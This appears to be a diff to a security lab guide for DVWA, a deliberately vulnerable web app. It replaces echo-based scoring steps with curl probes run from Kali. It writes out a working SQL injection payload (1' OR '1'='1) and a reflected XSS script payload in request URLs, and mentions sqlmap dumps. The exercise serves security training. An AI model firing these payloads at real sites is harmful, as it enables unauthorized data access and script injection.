@@ -46,14 +46,12 @@ If **Open DVWA** is not available yet on your deployment, use Kali CLI (`curl`) 
 ```
 
 **Done when:** Multiple user rows appear.  
-**Then:** On Kali, leave a trail for scoring (history must show the payload idea):
+**Then:** On Kali, capture the injection evidence for scoring:
 
 ```bash
-# Records the payload in shell history for Manual Check (optional if already typed elsewhere)
-echo "manual sqli probe: 1' OR '1'='1 against DVWA"
-# Or probe with curl after you have a PHPSESSID cookie:
-# curl -s -b 'PHPSESSID=YOUR_SESSION; security=low' \
-#   "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit"
+# Probe the injection point from Kali with curl and save the response:
+curl -s -b "PHPSESSID=<session_id>; security=low" \
+  "http://$TARGET_DVWA/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" > /tmp/sqli_probe.txt
 ```
 
 **Manual Check** on Injection Point.
@@ -155,17 +153,15 @@ SQLMap **must** run on Kali so scoring sees it. Running sqlmap only on your lapt
 
 3. Click **Submit**.
 4. **Done when:** The browser executes the JavaScript and displays an alert pop-up window, confirming that user-supplied script tags were reflected in the HTTP response without sanitization.
-5. On Kali, record command execution in shell history or save an artifact for scoring:
+5. On Kali, prove payload reflection and record evidence for scoring:
 
 ```bash
-# Record the payload in shell history for Manual Check:
-echo "<script>alert('XSS')</script>"
-# Or probe the endpoint directly with curl using your session cookie:
-# curl -s -b 'PHPSESSID=YOUR_SESSION; security=low' \
-#   "http://$TARGET_DVWA/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(%27XSS%27)%3C%2Fscript%3E&Submit=Submit"
+# Send the reflected XSS probe from Kali with curl and save DVWA's response:
+curl -s -b "PHPSESSID=<session_id>; security=low" \
+  "http://$TARGET_DVWA/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E&Submit=Submit" > /tmp/xss_reflected.txt
 
-# Or create a persistent artifact file:
-echo "<script>alert('XSS')</script>" > /tmp/xss_reflected.txt
+# Confirm that the server response contains the unescaped reflection:
+grep -i "Hello <script" /tmp/xss_reflected.txt
 ```
 
 6. Click **Manual Check** on **Reflected XSS** (Milestone 4).
@@ -186,7 +182,7 @@ Reflected XSS occurs when an application receives data in an HTTP request and in
 | Blank DVWA / connection refused | Use portal **Open DVWA** or confirm `$TARGET_DVWA` from Kali: `curl -sI http://$TARGET_DVWA/dvwa/` |
 | Only one row returned | Security not Low, or payload syntax |
 | Manual Check FAIL on M3 | sqlmap was not run **on Kali**; re-run dump there |
-| Manual Check FAIL on M4 | XSS probe not recorded in Kali bash history or `/tmp/xss_reflected.txt` |
+| Manual Check FAIL on M4 | XSS probe not recorded in Kali bash history (curl targeting xss_r with script payload) or `/tmp/xss_reflected.txt` lacking `Hello <script` |
 | XSS alert does not pop up | DVWA security is not set to Low; check DVWA Security menu |
 | Session expired in sqlmap | Log into DVWA again; refresh PHPSESSID |
 
